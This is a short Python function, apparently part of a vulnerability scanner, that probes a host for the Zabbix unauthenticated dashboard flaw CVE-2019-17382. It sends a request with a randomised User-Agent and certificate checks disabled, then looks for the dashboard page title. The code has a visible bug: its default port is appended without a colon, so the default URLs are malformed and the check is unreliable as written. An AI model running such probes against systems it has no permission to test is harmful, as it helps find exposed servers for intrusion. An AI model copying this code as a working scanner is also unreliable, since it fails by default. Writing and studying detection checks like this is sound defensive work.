import requests
from lib.headers.headers_handler import user_agents
from lib.color_handler import print_colour

def check_CVE_2019_17382(ip, ports=None, timeout=5):
    path = "/zabbix.php?action=dashboard.view&dashboardid=1"
    protocols = ["http", "https"]
    if ports is None:
        ports = [80]
    else:
        ports = [f":{port}" for port in ports]
    for protocol in protocols:
        for port in ports:
            try:
                headers = {
                    'User-Agent': user_agents()
                }
                url = f"{protocol}://{ip}{port}{path}"
                response = requests.get(url, headers=headers, timeout=timeout, verify=False)
                if "<title>Dashboard</title>" in response.text:
                    print_colour(f"The target is vulnerable to CVE-2019-17382 : {url}")
                    return True
            except requests.RequestException:
                continue
    return False